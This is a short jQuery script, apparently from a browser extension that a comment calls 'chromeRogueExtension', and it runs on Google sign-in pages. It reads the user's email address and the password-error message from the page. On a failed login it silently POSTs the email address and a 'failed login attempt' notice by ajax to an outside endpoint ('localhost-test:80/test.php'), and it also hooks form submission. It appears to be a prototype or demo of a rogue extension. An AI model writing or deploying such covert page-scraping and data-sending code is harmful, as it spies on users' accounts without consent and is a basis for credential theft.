$(function () {
	console.log("Hello World");
	var errorText = $("#errormsg_0_Passwd").html();
	var emailid = $("#email-display").html();
	if(!emailid){
		emailid = $("#reauthEmail").html();
	}
	if (errorText.trim() == "The email and password you entered don't match.") {
		var data = {
			action: emailid + " failed login attempt"
		};
		console.log(data)
		console.log("Starting the ajax call!!");
		$.ajax({
			type: "POST",
			dataType: "json",
			url: "https://localhost-test:80/test.php", //Relative or absolute path to response.php file
			data: data,
			error: function(a, b, c){
				console.log(a)
				console.log(b)
				console.log(c)
				console.log("Error ajax!!")
			},
			success: function (data) {
				console.log("Form submitted successfully.\nReturned json: " + data["json"]);
			}
		});
		//salert("chromeRogueExtension detected a failed Gmail login attempt for " + emailid + "!!")
	}
$("form").submit(function (e) {
	//var $this = $(this);
	console.log("Moosassu");
	//e.preventDefault();
});
});